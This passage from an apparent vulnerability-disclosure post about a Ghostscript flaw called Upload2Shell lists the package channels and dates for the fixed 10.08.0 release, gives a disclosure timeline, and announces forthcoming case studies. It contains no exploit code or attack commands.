### Other channels carrying the fix

Fixed Ghostscript builds also reached Windows and macOS packaging channels. The availability of a package does not tell us which Ghostscript binary a particular application uses.

| Channel | Version | Documented availability |
| --- | --- | --- |
| [Artifex Windows installers](https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/tag/gs10080) | `gs10080w32.exe` and `gs10080w64.exe` | 8 Sep 2026 upstream release |
| [conda-forge](https://anaconda.org/conda-forge/ghostscript/files?channel=main&type=conda) | `10.08.0` for Windows, macOS, and Linux | 8 Sep 2026 files |
| [Chocolatey](https://community.chocolatey.org/packages/Ghostscript/10.8.0) | `10.8.0` for Windows | 8 Sep 2026 package |
| [Cygwin](https://cygwin.com/pub/cygwin/x86_64/release/ghostscript/) | `10.08.0-1` for Windows | 19 Sep 2026 package archive |
| [MSYS2 / MinGW](https://packages.msys2.org/packages/mingw-w64-ucrt-x86_64-ghostscript) | `10.08.0-2` | 30 Sep 2026 build |
| [Homebrew](https://formulae.brew.sh/formula/ghostscript) | `10.08.0` | Available by 12 Nov; first date unestablished |
| [MacPorts](https://ports.macports.org/port/ghostscript/details/) | `10.08.0` | Available by 12 Nov; first date unestablished |

## The rest of the dependency tree

The dependency problem is easy to miss from the top of an application. Several layers below, a file may enter PostScript or another interpreter that never appeared in the application's security review. A review that checks only whether the upload handler accepts trusted file types can miss a vulnerability in the code that eventually processes them. A penetration test that stops at the same boundary has the same blind spot.

Alongside this Type 1 issue, our broader Ghostscript audit reached production services at Dropbox and other redacted vendors through separate findings. Each program paid its maximum bounty. Their case studies will explain the individual root causes and proofs once we have permission to publish the technical details. The series is organized around the underlying bugs as well as the products.

WordPress released its mitigation on 12 August. Artifex authored the Ghostscript fix on 2 September, committed it on 7 September, and released 10.08.0 on 8 September. We completed the Debian network CUPS proof on 17 September. The Ghostscript CVE was published on 9 November in US Eastern time.

**The Debian 13 CUPS chain will be the first full case study and PoC in this series.** The other product writeups will follow, with the build, delivery path, exploit result, and vendor response for each. We will add their links to the tables as they appear.

We expect other researchers to find more applications affected by this flaw. The useful place to look is the processing that follows an accepted file: thumbnail generation, metadata extraction, document import, and print conversion. Each can hand an attacker-controlled document to a process with access the sender does not have. Upload2Shell let the document use that access for itself.